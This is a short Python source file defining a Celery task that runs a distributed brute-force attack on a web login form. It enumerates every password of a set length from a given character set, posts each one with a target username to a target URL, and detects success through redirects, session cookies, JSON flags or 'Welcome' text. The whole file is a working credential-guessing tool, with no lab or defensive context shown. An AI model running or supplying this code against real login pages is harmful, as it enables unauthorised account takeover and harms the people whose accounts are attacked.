
from celery import Celery
import itertools

# --- Import config ---
try:
	from config import CELERY_BROKER_URL, CELERY_RESULT_BACKEND
except ImportError:
	CELERY_BROKER_URL = 'redis://localhost:6379/0'
	CELERY_RESULT_BACKEND = 'redis://localhost:6379/0'

app = Celery('guessing',
	broker=CELERY_BROKER_URL,
	backend=CELERY_RESULT_BACKEND
)

@app.task
def brute_force_chunk(target_username, target_url, password_field, username_field, charset, length, prefix, timeout):
	import requests
	for suffix in itertools.product(charset, repeat=length - len(prefix)):
		pwd = prefix + "".join(suffix)
		payload = {username_field: target_username, password_field: pwd}
		try:
			resp = requests.post(target_url, data=payload, timeout=timeout, allow_redirects=False)
			# --- Success heuristics (reuse your logic) ---
			try:
				j = resp.json()
				if isinstance(j, dict) and j.get("success") is True:
					return pwd
			except Exception:
				pass
			if resp.status_code in (301, 302, 303, 307):
				loc = (resp.headers.get("Location") or "").lower()
				if any(k in loc for k in ("dashboard", "profile", "home")):
					return pwd
			if any(k in resp.cookies.get_dict() for k in ("session", "sessionid", "flask_session")):
				return pwd
			body = resp.text or ""
			if "Login successful!" in body or target_username in body or "Welcome" in body:
				return pwd
		except Exception:
			continue
	return None
